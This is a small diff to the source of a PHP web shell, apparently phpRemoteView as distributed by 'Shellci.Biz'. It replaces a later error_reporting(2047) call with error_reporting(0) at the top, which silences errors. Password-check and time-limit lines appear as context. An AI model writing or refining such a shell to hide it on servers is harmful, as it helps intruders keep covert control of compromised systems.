@@ -1,4 +1,5 @@
 <?php
+error_reporting(0);
 
 /* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
  *  # Shellci.Biz
@@ -115,8 +116,6 @@
       header("HTTP/1.0 401 Unauthorized");
       exit("<h1><a href=http://php.spb.ru/remview/>phpRemoteView</a>: Access Denied - password erroneous</h1>\n");
    }
-
-   error_reporting(2047);
    set_magic_quotes_runtime(0);
    @set_time_limit(0);
    @ini_set('max_execution_time',0);
